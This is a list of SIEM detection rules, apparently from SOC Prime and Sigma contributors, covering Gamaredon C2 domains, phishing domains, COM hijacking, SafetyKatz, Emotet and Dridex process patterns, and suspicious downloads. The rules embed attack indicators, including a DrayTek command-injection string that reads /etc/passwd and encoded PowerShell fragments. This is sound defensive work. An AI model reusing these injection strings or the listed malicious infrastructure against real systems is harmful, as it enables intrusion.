<li><a href="#">rule detecting_gamaredon_groups_cc_servers_ip_addresses_and_domains_proxy { meta: author = "Eugene Nechiporenko, SOC Prime" description = "This rule detects network connections to compromised IPs and domains related with Gamaredon Group activity (Proxy - domain/IP) License: ." reference = "" version = "0.01" created = "2018/11/22" product = "proxy" mitre = "Command and Control, t1071" events: (($selection1.principal.ip = "95.142.45.86" or $selection1.principal.ip = "95.142.45.58" or $selection1.principal.ip = "95.142.45.57" or $selection1.principal.ip = "95.142.45.48" or $selection1.principal.ip = "95.142.45.44" or $selection1.principal.ip = "95.142.45.185" or $selection1.principal.ip = "95.142.45.142" or $selection1.principal.ip = "95.142.45.13" or $selection1.principal.ip = "95.142.45.118" or $selection1.principal.ip = "94.130.217.187" or $selection1.principal.ip = "80.211.167.231" or $selection1.principal.ip = "5.23.55.212" or $selection1.principal.ip = "46.148.20.31" or $selection1.principal.ip = "185.231.155.12" or $selection1.principal.ip = "185.231.154.25" or $selection1.principal.ip = "185.231.154.154" or $selection1.principal.ip = "185.158.115.137") or ($selection1.target.ip = "95.142.45.86" or $selection1.target.ip = "95.142.45.58" or $selection1.target.ip = "95.142.45.57" or $selection1.target.ip = "95.142.45.48" or $selection1.target.ip = "95.142.45.44" or $selection1.target.ip = "95.142.45.185" or $selection1.target.ip = "95.142.45.142" or $selection1.target.ip = "95.142.45.13" or $selection1.target.ip = "95.142.45.118" or $selection1.target.ip = "94.130.217.187" or $selection1.target.ip = "80.211.167.231" or $selection1.target.ip = "5.23.55.212" or $selection1.target.ip = "46.148.20.31" or $selection1.target.ip = "185.231.155.12" or $selection1.target.ip = "185.231.154.25" or $selection1.target.ip = "185.231.154.154" or $selection1.target.ip = "185.158.115.137") or ($selection1.target.url = "natos-drp.ddns.net" or $selection1.target.url = "nato-drp.ddns.net" or $selection1.target.url = "updates-spreadwork.pw" or $selection1.target.url = "ukraine-news.ddns.net" or $selection1.target.url = "ukraina-drp.ddns.net" or $selection1.target.url = "tovar-es.ddns.net" or $selection1.target.url = "start-usb.ddns.net" or $selection1.target.url = "sovetkirov.ddns.net" or $selection1.target.url = "singles-office.ddns.net" or $selection1.target.url = "single-office.ddns.net" or $selection1.target.url = "yousister.ddns.net" or $selection1.target.url = "wq03.ddns.net" or $selection1.target.url = "wq02.ddns.net" or $selection1.target.url = "wq01.ddns.net" or $selection1.target.url = "werdikt.ddns.net" or $selection1.target.url = "wareface.ddns.net" or $selection1.target.url = "vnc-new.ddns.net" or $selection1.target.url = "ut03.ddns.net" or $selection1.target.url = "ut02.ddns.net" or $selection1.target.url = "ut01.ddns.net" or $selection1.target.url = "us03.ddns.net" or $selection1.target.url = "us02.ddns.net" or $selection1.target.url = "us01.ddns.net" or $selection1.target.url = "topline.myftp.org" or $selection1.target.url = "sushi-bar.ddns.net" or $selection1.target.url = "po03.ddns.net" or $selection1.target.url = "po02.ddns.net" or $selection1.target.url = "po01.ddns.net" or $selection1.target.url = "pk03.ddns.net" or $selection1.target.url = "pk02.ddns.net" or $selection1.target.url = "pk01.ddns.net" or $selection1.target.url = "orizoh88.ddns.net" or $selection1.target.url = "optima-se.ddns.net" or $selection1.target.url = "new-club.ddns.net" or $selection1.target.url = "mykarina.ddns.net" or $selection1.target.url = "microsoft-single.ddns.net" or $selection1.target.url = "metro-exodus.ddns.net" or $selection1.target.url = "marishka.ddns.net" or $selection1.target.url = "macdocs.ddns.net" or $selection1.target.url = "karasto01.ddns.net" or $selection1.target.url = "gr03.ddns.net" or $selection1.target.url = "gr02.ddns.net" or $selection1.target.url = "gr01.ddns.net" or $selection1.target.url = "connect-updates.ddns.net" or $selection1.target.url = "chrome-update.ddns.net" or $selection1.target.url = "samotsvety.com.ua" or $selection1.target.url = "admin-ru.ru" or $selection1.target.url = "adobe.update-service.net" or $selection1.target.url = "apploadapp.webhop.me" or $selection1.target.url = "brokbridge.com" or $selection1.target.url = "cat.gotdns.ch" or $selection1.target.url = "check-update.ru" or $selection1.target.url = "childrights.in.ua" or $selection1.target.url = "conhost.myftp.org" or $selection1.target.url = "docdownload.ddns.net" or $selection1.target.url = "downloads.email-attachments.ru" or $selection1.target.url = "downloads.file-attachments.ru" or $selection1.target.url = "dyndownload.serveirc.com" or $selection1.target.url = "e.muravej.ua" or $selection1.target.url = "email-attachments.ru" or $selection1.target.url = "file-attachments.ru" or $selection1.target.url = "freefiles.myftp.biz" or $selection1.target.url = "getmyfile.webhop.me" or $selection1.target.url = "googlefiles.serveftp.com" or $selection1.target.url = "grom56.ddns.net" or $selection1.target.url = "grom90.ddns.net" or $selection1.target.url = "hrome-update.ru" or $selection1.target.url = "hrome-updater.ru" or $selection1.target.url = "loaderskypetm.webhop.me" or $selection1.target.url = "loadsoulip.serveftp.com" or $selection1.target.url = "mail.file-attachments.ru" or $selection1.target.url = "mails.redirectme.net" or $selection1.target.url = "mars-ru.ru" or $selection1.target.url = "msrestore.ru" or $selection1.target.url = "oficialsite.webhop.me" or $selection1.target.url = "parkingdoma.webhop.me" or $selection1.target.url = "poligjong.webhop.me" or $selection1.target.url = "polistar.ddns.net" or $selection1.target.url = "proxy-spread.ru" or $selection1.target.url = "rms.admin-ru.ru" or $selection1.target.url = "skypeemocache.ru" or $selection1.target.url = "skypeupdate.ru" or $selection1.target.url = "spbpool.ddns.net" or $selection1.target.url = "spread-service.ru" or $selection1.target.url = "spread-ss.ru" or $selection1.target.url = "spread-updates.ru" or $selection1.target.url = "stor.tainfo.com.ua" or $selection1.target.url = "tortilla.sytes.net" or $selection1.target.url = "ukrnet.serveftp.com" or $selection1.target.url = "ukrway.galaktion.ru" or $selection1.target.url = "umachka.ua" or $selection1.target.url = "update-service.net" or $selection1.target.url = "updatesp.ddns.net" or $selection1.target.url = "updateviber.sytes.net" or $selection1.target.url = "webclidie.webhop.me" or $selection1.target.url = "win-restore.ru" or $selection1.target.url = "winloaded.sytes.net" or $selection1.target.url = "winupdateloader.ru" or $selection1.target.url = "www.file-attachments.ru" or $selection1.target.url = "www.win-restore.ru" or $selection1.target.url = "yfperoliz.webhop.me" or $selection1.target.url = "prestigeclub.frantov.com.ua" or $selection1.target.url = "viberload.ddns.net")) condition: $selection1 
<li><a href="#">rule detecting_phishing_domains_proxy { meta: author = "Dmitriy Dyakon, SOC Prime" description = "This rule detects network connections to Phishing domains. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "Command and Control, t1071" events: (($selection_URLs_1.target.url = "com-managers-updateds-notifications-accounts.com" or $selection_URLs_1.target.url = "com-updated-manager-notifications-accounts.info" or $selection_URLs_1.target.url = "com-index-managers-updateds-notifications-accounts.com" or $selection_URLs_1.target.url = "com-notice-index-managers-review-accounts.com" or $selection_URLs_1.target.url = "appleid.com-notice-index-managers-review-accounts.com" or $selection_URLs_1.target.url = "appleid.com-index-managers-updateds-notifications-accounts.com" or $selection_URLs_1.target.url = "appleid.com-updated-manager-notifications-accounts.info" or $selection_URLs_1.target.url = "appleid.com-manager-updateds-account-notifeds.com" or $selection_URLs_1.target.url = "com-manager-updateds-account-notifeds.com" or $selection_URLs_1.target.url = "appleid.com-managers-updateds-notifications-accounts.com" or $selection_URLs_1.target.url = "appleid.com-index-managers-updateds-notifications-accounts.info" or $selection_URLs_1.target.url = "com-index-managers-updateds-notifications-accounts.info") or ($selection_URLs_1.target.url = "com-authenticationid-account-id-291175.com" or $selection_URLs_1.target.url = "com-authentication-account-id-67800.com" or $selection_URLs_1.target.url = "account-signinid.com-authentication-account-id-67800.com" or $selection_URLs_1.target.url = "com-reviewid-account-authenticationid-11250.com" or $selection_URLs_1.target.url = "com-authentication-account-id-67991.com" or $selection_URLs_1.target.url = "accountid-signin.com-authenticationid-account-id-291175.com") or ($selection_URLs_1.target.url = "reverify-id-apple.com" or $selection_URLs_1.target.url = "re-verify-id-apple.com" or $selection_URLs_1.target.url = "reverify-id-apple.com" or $selection_URLs_1.target.url = "un-verify-id-apple.com" or $selection_URLs_1.target.url = "unverify-id-apple.com" or $selection_URLs_1.target.url = "re-verify-id-apple.com" or $selection_URLs_1.target.url = "unverify-id-apple.com" or $selection_URLs_1.target.url = "www.unverify-id-apple.com" or $selection_URLs_1.target.url = "un-verify-id-apple.com" or $selection_URLs_1.target.url = "wazze-design.com" or $selection_URLs_1.target.url = "www.wazze-design.com" or $selection_URLs_1.target.url = "www.re-verify-id-apple.com" or $selection_URLs_1.target.url = "www.reverify-id-apple.com" or $selection_URLs_1.target.url = "www.un-verify-id-apple.com" or $selection_URLs_1.target.url = "ns1.stitis.com" or $selection_URLs_1.target.url = "ns2.stitis.com" or $selection_URLs_1.target.url = "disable-id-apple.com" or $selection_URLs_1.target.url = "www.support-id-icloud.com" or $selection_URLs_1.target.url = "apple.com-verif-id.app") or ($selection_URLs_1.target.url = "pages-secure.com-verifications-account-webservices-appleid.com" or $selection_URLs_1.target.url = "com-verifications-account-webservices-appleid.com" or $selection_URLs_1.target.url = "com-verifications-account-webservices-appleid.com" or $selection_URLs_1.target.url = "com-page-secure-webmail-supportcenter.com" or $selection_URLs_1.target.url = "identification-account.com-page-secure-webmail-supportcenter.com" or $selection_URLs_1.target.url = "www.com-page-secure-webmail-supportcenter.com" or $selection_URLs_1.target.url = "com-page-secure-webmail-supportcenter.com")) condition: $selection_URLs_1 
<li><a href="#">rule detection_of_com_hijacking { meta: author = "Emir Erdogan" description = "Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1122" events: ($selection.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\reg.exe" and (re.regex($selection.target.process.command_line, `reg add .*\\SOFTWARE\\Classes\\CLSID.*.*\.dll`) or re.regex($selection.target.process.command_line, `reg add .*\\SOFTWARE\\Classes\\CLSID.*.*\.exe`))) condition: $selection 
<li><a href="#">rule detection_of_powershell_execution_via_dll { meta: author = "Markus Neis" description = "Detects PowerShell Strings applied to rundllas seen in PowerShdll.dll License: ." reference = "" version = "0.01" created = "2018/08/25" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.target.process.file.full_path, `.*\\rundll32\.exe`) or re.regex($selection1.metadata.description, `.*Windows-Hostprozess \(Rundll32\).*`)) and (re.regex($selection1.target.process.command_line, `.*Default\.GetString.*`) or re.regex($selection1.target.process.command_line, `.*FromBase64String.*`))) condition: $selection1 
<li><a href="#">rule detection_of_safetykatz { meta: author = "Markus Neis" description = "Detects possible SafetyKatz Behaviour License: ." reference = "" version = "0.01" created = "2018/07/24" product = "windows" service = "sysmon" mitre = "credential_access, T1003" events: ($selection.metadata.product_event_type = "11" and re.regex($selection.target.file.full_path, `.*\\Temp\\debug\.bin`)) condition: $selection 
<li><a href="#">rule detection_of_winrs_usage { meta: author = "Sreeman" description = "Windows Remote Shell (WinRS) is a command line tool that is part of Windows 2008 and later. If WinRM is enabled this utility can be used to execute commands on a host remotely. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "lateral movement, execution, t1028" events: (($selection.target.process.command_line = "winrs -r" or $selection.target.process.command_line = "winrs /r") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule detects_coronavirus_used_in_malicious_campaigns { meta: author = "Osman Demir" description = "Detects Covid-19 Malicious Campaign License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1204, execution" events: (($selection.target.file.full_path = "CORONA VIRUS AFFECTED CREW AND VESSEL.xlsm" or $selection.target.file.full_path = "CoronaVirusSafetyMeasures_pdf.exe" or $selection.target.file.full_path = "CoronaVirusSafetyMeasures_xls.exe" or $selection.target.file.full_path = "LIST OF CORONA VIRUS VICTIM.exe" or $selection.target.file.full_path = "POEA HEALTH ADVISORY re-2020 Novel Corona Virus.pdf.exe" or $selection.target.file.full_path = "POEA Advisories re-2020 Novel Corona Virus.2.pdf.exe") or ($selection.target.file.md5 = "ab533d6ca0c2be8860a0f7fbfc7820ffd595edc63e540ff4c5991808da6a257d" or $selection.target.file.md5 = "17161e0ab3907f637c2202a384de67fca49171c79b1b24db7c78a4680637e3d5" or $selection.target.file.md5 = "315e297ac510f3f2a60176f9c12fcf92681bbad758135767ba805cdea830b9ee" or $selection.target.file.md5 = "c9c0180eba2a712f1aba1303b90cbf12c1117451ce13b68715931abc437b10cd" or $selection.target.file.md5 = "29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923" or $selection.target.file.md5 = "3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2" or $selection.target.file.md5 = "3e6166a6961bc7c23d316ea9bca87d8287a4044865c3e73064054e805ef5ca1a" or $selection.target.file.md5 = "b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd" or $selection.target.file.md5 = "2b35aa9c70ef66197abfb9bc409952897f9f70818633ab43da85b3825b256307" or $selection.target.file.md5 = "0b3e7faa3ad28853bb2b2ef188b310a67663a96544076cd71c32ac088f9af74d" or $selection.target.file.md5 = "13c0165703482dd521e1c1185838a6a12ed5e980e7951a130444cf2feed1102e" or $selection.target.file.md5 = "fda64c0ac9be3d10c28035d12ac0f63d85bb0733e78fe634a51474c83d0a0df8" or $selection.target.file.md5 = "126569286f8a4caeeaba372c0bdba93a9b0639beaad9c250b8223f8ecc1e8040" or $selection.target.file.md5 = "b9e5849d3ad904d0a8532a886bd3630c4eec3a6faf0cc68658f5ee4a5e803be" or $selection.target.file.md5 = "6cc5e1e72411c4f4b2033ddafe61fdb567cb0e17ba7a3247acd60cbd4bc57bfb" or $selection.target.file.md5 = "7c12951672fb903f520136d191f3537bc74f832c5fc573909df4c7fa85c15105" or $selection.target.file.md5 = "dd6cf8e8a31f67101f974151333be2f0d674e170edd624ef9b850e3ee8698fa2")) condition: $selection 
<li><a href="#">rule detects_local_user_creation { meta: author = "Patrick Bareiss" description = "Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "persistence, t1136" events: $selection.metadata.product_event_type = "4720" condition: $selection 
<li><a href="#">rule detects_malware_acrord32exe_execution_process { meta: author = "Eugene Nechiporenko, SOC Prime" description = "Masquerading malware with the name of a legitimate process name for Adobe's Acrobat Reader License: ." reference = "" version = "0.01" created = "2018/03/13" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1036" events: (($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\AcroRD32\.exe`)) and not (re.regex($selection.target.process.file.full_path, `.*\\Adobe\\Acrobat Reader DC\\Reader\\AcroRD32\.exe`))) condition: $selection 
<li><a href="#">rule detects_powershell_attack_via_av_ids { meta: author = "Osman Demir" description = "Detects powershell attacks from antivurus logs License: ." reference = "" version = "0.01" created = "2021-03-09" category = "antivirus" events: ($selection.target.registry.registry_value_data = "Powershell Injection Attack" or $selection.target.registry.registry_value_data = "ICMP PowerShell Shell Activity" or $selection.target.registry.registry_value_data = "Powershell Payload Web Delivery" or $selection.target.registry.registry_value_data = "Malicious PowerShell Script Download" or $selection.target.registry.registry_value_data = "Powershell Empire Activity" or $selection.target.registry.registry_value_data = "W97M.Downloader Powershell Activity") condition: $selection 
<li><a href="#">rule disable_services_startup_detected { meta: author = "Furkan Celik" description = "A process attempted to disable a common security related service from starting at system boot. License: ." reference = "" version = "0.01" created = "2020/04/17" product = "windows" service = "powershell" mitre = "execution, defense_evasion, t1204, t1059" events: ($selection.target.process.command_line = "cmd.exe /c sc stop wuauserv" or $selection.target.process.command_line = "stop wuauserv") condition: $selection 
<li><a href="#">rule diskshadow_and_vshadow_launch_detection { meta: author = "Eugene Nechiporenko, SOC Prime" description = "This rule detects execution vshadow.exe and diskshadow.exe License: ." reference = "" version = "0.01" created = "2018/04/25" product = "windows" service = "process_creation" mitre = "Credential Access, t1003, Persistence, t1060, t1053" events: (re.regex($selection1.src.process.file.full_path, `.*\\vshadow\.exe`) or re.regex($selection1.src.process.file.full_path, `.*\\diskshadow\.exe`) or (re.regex($selection1.target.process.command_line, `.*vshadow\.exe -nw -exec=.*`) or re.regex($selection1.target.process.command_line, `.*diskshadow\.exe /s \?:\\\\.*`))) condition: $selection1 
<li><a href="#">rule dns_txt_answer_with_possible_execution_strings { meta: author = "Markus Neis" description = "Detects strings used in command execution in DNS TXT Answer License: ." reference = "" version = "0.01" created = "2018/08/08" category = "dns" mitre = "t1071" events: (re.regex($selection.network.dns.answers.data, `.*IEX.*`) or re.regex($selection.network.dns.answers.data, `.*Invoke-Expression.*`) or re.regex($selection.network.dns.answers.data, `.*cmd\.exe.*`)) condition: $selection 
<li><a href="#">rule docker_user_agent { meta: author = "Simon Lavigne" description = "Detects docker user agent strings in proxy logs when a user runs the 'docker push' command. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" events: (re.regex($selection.src.application, `docker/.*`) and $selection.network.http.method = "PUT") condition: $selection 
<li><a href="#">rule download_from_suspicious_dyndns_hosts { meta: author = "Florian Roth" description = "Detects download of certain file types from hosts with dynamic DNS names (selected list) License: ." reference = "" version = "0.01" created = "2017/11/08" category = "proxy" events: (($selection.target.url = "exe" or $selection.target.url = "vbs" or $selection.target.url = "bat" or $selection.target.url = "rar" or $selection.target.url = "ps1" or $selection.target.url = "doc" or $selection.target.url = "docm" or $selection.target.url = "xls" or $selection.target.url = "xlsm" or $selection.target.url = "pptm" or $selection.target.url = "rtf" or $selection.target.url = "hta" or $selection.target.url = "dll" or $selection.target.url = "ws" or $selection.target.url = "wsf" or $selection.target.url = "sct" or $selection.target.url = "zip") and (re.regex($selection.target.hostname, `.*\.hopto\.org`) or re.regex($selection.target.hostname, `.*\.no-ip\.org`) or re.regex($selection.target.hostname, `.*\.no-ip\.info`) or re.regex($selection.target.hostname, `.*\.no-ip\.biz`) or re.regex($selection.target.hostname, `.*\.no-ip\.com`) or re.regex($selection.target.hostname, `.*\.noip\.com`) or re.regex($selection.target.hostname, `.*\.ddns\.name`) or re.regex($selection.target.hostname, `.*\.myftp\.org`) or re.regex($selection.target.hostname, `.*\.myftp\.biz`) or re.regex($selection.target.hostname, `.*\.serveblog\.net`) or re.regex($selection.target.hostname, `.*\.servebeer\.com`) or re.regex($selection.target.hostname, `.*\.servemp3\.com`) or re.regex($selection.target.hostname, `.*\.serveftp\.com`) or re.regex($selection.target.hostname, `.*\.servequake\.com`) or re.regex($selection.target.hostname, `.*\.servehalflife\.com`) or re.regex($selection.target.hostname, `.*\.servehttp\.com`) or re.regex($selection.target.hostname, `.*\.servegame\.com`) or re.regex($selection.target.hostname, `.*\.servepics\.com`) or re.regex($selection.target.hostname, `.*\.myvnc\.com`) or re.regex($selection.target.hostname, `.*\.ignorelist\.com`) or re.regex($selection.target.hostname, `.*\.jkub\.com`) or re.regex($selection.target.hostname, `.*\.dlinkddns\.com`) or re.regex($selection.target.hostname, `.*\.jumpingcrab\.com`) or re.regex($selection.target.hostname, `.*\.ddns\.info`) or re.regex($selection.target.hostname, `.*\.mooo\.com`) or re.regex($selection.target.hostname, `.*\.dns-dns\.com`) or re.regex($selection.target.hostname, `.*\.strangled\.net`) or re.regex($selection.target.hostname, `.*\.ddns\.info`) or re.regex($selection.target.hostname, `.*\.adultdns\.net`) or re.regex($selection.target.hostname, `.*\.craftx\.biz`) or re.regex($selection.target.hostname, `.*\.ddns01\.com`) or re.regex($selection.target.hostname, `.*\.dns53\.biz`) or re.regex($selection.target.hostname, `.*\.dnsapi\.info`) or re.regex($selection.target.hostname, `.*\.dnsd\.info`) or re.regex($selection.target.hostname, `.*\.dnsdynamic\.com`) or re.regex($selection.target.hostname, `.*\.dnsdynamic\.net`) or re.regex($selection.target.hostname, `.*\.dnsget\.org`) or re.regex($selection.target.hostname, `.*\.fe100\.net`) or re.regex($selection.target.hostname, `.*\.flashserv\.net`) or re.regex($selection.target.hostname, `.*\.ftp21\.net`) or re.regex($selection.target.hostname, `.*\.http01\.com`) or re.regex($selection.target.hostname, `.*\.http80\.info`) or re.regex($selection.target.hostname, `.*\.https443\.com`) or re.regex($selection.target.hostname, `.*\.imap01\.com`) or re.regex($selection.target.hostname, `.*\.kadm5\.com`) or re.regex($selection.target.hostname, `.*\.mysq1\.net`) or re.regex($selection.target.hostname, `.*\.ns360\.info`) or re.regex($selection.target.hostname, `.*\.ntdll\.net`) or re.regex($selection.target.hostname, `.*\.ole32\.com`) or re.regex($selection.target.hostname, `.*\.proxy8080\.com`) or re.regex($selection.target.hostname, `.*\.sql01\.com`) or re.regex($selection.target.hostname, `.*\.ssh01\.com`) or re.regex($selection.target.hostname, `.*\.ssh22\.net`) or re.regex($selection.target.hostname, `.*\.tempors\.com`) or re.regex($selection.target.hostname, `.*\.tftpd\.net`) or re.regex($selection.target.hostname, `.*\.ttl60\.com`) or re.regex($selection.target.hostname, `.*\.ttl60\.org`) or re.regex($selection.target.hostname, `.*\.user32\.com`) or re.regex($selection.target.hostname, `.*\.voip01\.com`) or re.regex($selection.target.hostname, `.*\.wow64\.net`) or re.regex($selection.target.hostname, `.*\.x64\.me`) or re.regex($selection.target.hostname, `.*\.xns01\.com`) or re.regex($selection.target.hostname, `.*\.dyndns\.org`) or re.regex($selection.target.hostname, `.*\.dyndns\.info`) or re.regex($selection.target.hostname, `.*\.dyndns\.tv`) or re.regex($selection.target.hostname, `.*\.dyndns-at-home\.com`) or re.regex($selection.target.hostname, `.*\.dnsomatic\.com`) or re.regex($selection.target.hostname, `.*\.zapto\.org`) or re.regex($selection.target.hostname, `.*\.webhop\.net`) or re.regex($selection.target.hostname, `.*\.25u\.com`) or re.regex($selection.target.hostname, `.*\.slyip\.net`))) condition: $selection 
<li><a href="#">rule download_from_suspicious_tld { meta: author = "Florian Roth" description = "Detects download of certain file types from hosts in suspicious TLDs License: ." reference = "" version = "0.01" created = "2018/06/13" category = "proxy" events: (($selection.target.url = "exe" or $selection.target.url = "vbs" or $selection.target.url = "bat" or $selection.target.url = "rar" or $selection.target.url = "ps1" or $selection.target.url = "doc" or $selection.target.url = "docm" or $selection.target.url = "xls" or $selection.target.url = "xlsm" or $selection.target.url = "pptm" or $selection.target.url = "rtf" or $selection.target.url = "hta" or $selection.target.url = "dll" or $selection.target.url = "ws" or $selection.target.url = "wsf" or $selection.target.url = "sct" or $selection.target.url = "zip") and (re.regex($selection.target.hostname, `.*\.country`) or re.regex($selection.target.hostname, `.*\.stream`) or re.regex($selection.target.hostname, `.*\.gdn`) or re.regex($selection.target.hostname, `.*\.mom`) or re.regex($selection.target.hostname, `.*\.xin`) or re.regex($selection.target.hostname, `.*\.kim`) or re.regex($selection.target.hostname, `.*\.men`) or re.regex($selection.target.hostname, `.*\.loan`) or re.regex($selection.target.hostname, `.*\.download`) or re.regex($selection.target.hostname, `.*\.racing`) or re.regex($selection.target.hostname, `.*\.online`) or re.regex($selection.target.hostname, `.*\.science`) or re.regex($selection.target.hostname, `.*\.ren`) or re.regex($selection.target.hostname, `.*\.gb`) or re.regex($selection.target.hostname, `.*\.win`) or re.regex($selection.target.hostname, `.*\.top`) or re.regex($selection.target.hostname, `.*\.review`) or re.regex($selection.target.hostname, `.*\.vip`) or re.regex($selection.target.hostname, `.*\.party`) or re.regex($selection.target.hostname, `.*\.tech`) or re.regex($selection.target.hostname, `.*\.xyz`) or re.regex($selection.target.hostname, `.*\.date`) or re.regex($selection.target.hostname, `.*\.faith`) or re.regex($selection.target.hostname, `.*\.zip`) or re.regex($selection.target.hostname, `.*\.cricket`) or re.regex($selection.target.hostname, `.*\.space`) or re.regex($selection.target.hostname, `.*\.info`) or re.regex($selection.target.hostname, `.*\.vn`) or re.regex($selection.target.hostname, `.*\.cm`) or re.regex($selection.target.hostname, `.*\.am`) or re.regex($selection.target.hostname, `.*\.cc`) or re.regex($selection.target.hostname, `.*\.asia`) or re.regex($selection.target.hostname, `.*\.ws`) or re.regex($selection.target.hostname, `.*\.tk`) or re.regex($selection.target.hostname, `.*\.biz`) or re.regex($selection.target.hostname, `.*\.su`) or re.regex($selection.target.hostname, `.*\.st`) or re.regex($selection.target.hostname, `.*\.ro`) or re.regex($selection.target.hostname, `.*\.ge`) or re.regex($selection.target.hostname, `.*\.ms`) or re.regex($selection.target.hostname, `.*\.pk`) or re.regex($selection.target.hostname, `.*\.nu`) or re.regex($selection.target.hostname, `.*\.me`) or re.regex($selection.target.hostname, `.*\.ph`) or re.regex($selection.target.hostname, `.*\.to`) or re.regex($selection.target.hostname, `.*\.tt`) or re.regex($selection.target.hostname, `.*\.name`) or re.regex($selection.target.hostname, `.*\.tv`) or re.regex($selection.target.hostname, `.*\.kz`) or re.regex($selection.target.hostname, `.*\.tc`) or re.regex($selection.target.hostname, `.*\.mobi`) or re.regex($selection.target.hostname, `.*\.study`) or re.regex($selection.target.hostname, `.*\.click`) or re.regex($selection.target.hostname, `.*\.link`) or re.regex($selection.target.hostname, `.*\.trade`) or re.regex($selection.target.hostname, `.*\.accountant`) or re.regex($selection.target.hostname, `.*\.cf`) or re.regex($selection.target.hostname, `.*\.gq`) or re.regex($selection.target.hostname, `.*\.ml`) or re.regex($selection.target.hostname, `.*\.ga`))) condition: $selection 
<li><a href="#">rule draytek_preauth_remote_root_rce { meta: author = "Osman Demir" description = "Detects (CVE-2020-8515) Exploit Attempts License: ." reference = "" version = "0.01" created = "2021-03-09" category = "webserver" mitre = "t1190, initial_access" events: ($selection_one.network.http.method = "POST" and re.regex($selection_one.target.url, `.*/cgi-bin/mainfunction\.cgi`) and $selection_one.network.http.response_code = "200" and re.regex($selection_one.target.url, `.*action=login&keyPath='/bin/cat${IFS}/etc/passwd'&loginUser=a&loginPwd=a.*`)) condition: $selection_one 
<li><a href="#">rule dridex_process_pattern { meta: author = "Florian Roth" description = "Detects typical Dridex process patterns License: ." reference = "" version = "0.01" created = "2019/01/10" category = "process_creation" product = "windows" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.target.process.command_line, `.*\\svchost\.exe C:\\Users\\.*\\Desktop\\.*`) or (re.regex($selection1.src.process.file.full_path, `.*\\svchost\.exe.*`) and (re.regex($selection1.target.process.command_line, `.*whoami\.exe /all`) or re.regex($selection1.target.process.command_line, `.*net\.exe view`))))) condition: $selection1 
<li><a href="#">rule dynamic_data_exchange_spawning_commandline_or_powershell_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects behavior as described on the Mitre Att&ck Matrix Technique 1173 License: ." reference = "" version = "0.01" created = "2019/09/19" product = "windows" service = "sysmon" mitre = "execution, t1173" events: ($selection1.metadata.product_event_type = "1" and re.regex($selection1.src.process.file.full_path, `.*\\Microsoft Office.*`) and ($selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\cmd.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\system32\\cmd.exe" or re.regex($selection1.target.process.file.full_path, `.*\\powershell\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\.exe`))) condition: $selection1 
<li><a href="#">rule ekanssnake_ransomware_sysmon_detection { meta: author = "Ariel Millahuel" description = "EKANS/SNAKE is a Malware that attempts to attack ICS (Industrial Control Systems) environments License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "defense_evasion, T1112" events: ($selection1.metadata.product_event_type = "13" and (re.regex($selection1.target.registry.registry_key, `.*\\DefaultObjectStore\\LruList\\.*`) or re.regex($selection1.target.registry.registry_key, `.*\\DefaultObjectStore\\LruList\\00000000000002FC\\.*`) or re.regex($selection1.target.registry.registry_key, `.*\\DefaultObjectStore\\ObjectTable\\E8\\.*`) or re.regex($selection1.target.registry.registry_key, `.*\\DefaultObjectStore\\ObjectTable\\E9\\.*`) or re.regex($selection1.target.registry.registry_key, `.*\\CurrentVersion\\NetworkList\\Nla\\Cache\\Intranet\\.*`))) condition: $selection1 
<li><a href="#">rule emotet_process_creation { meta: author = "Florian Roth" description = "Detects all Emotet like process executions that are not covered by the more generic rules License: ." reference = "" version = "0.01" created = "2019/09/30" category = "process_creation" product = "windows" events: ((re.regex($selection.target.process.command_line, `.* -e PAA.*`) or re.regex($selection.target.process.command_line, `.* -en PAA.*`) or re.regex($selection.target.process.command_line, `.* -enc PAA.*`) or re.regex($selection.target.process.command_line, `.* -enco PAA.*`) or re.regex($selection.target.process.command_line, `.* -encod PAA.*`) or re.regex($selection.target.process.command_line, `.*JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ.*`) or re.regex($selection.target.process.command_line, `.*QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA.*`) or re.regex($selection.target.process.command_line, `.*kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA.*`) or re.regex($selection.target.process.command_line, `.*IgAoACcAKgAnACkAOwAkA.*`) or re.regex($selection.target.process.command_line, `.*IAKAAnACoAJwApADsAJA.*`) or re.regex($selection.target.process.command_line, `.*iACgAJwAqACcAKQA7ACQA.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
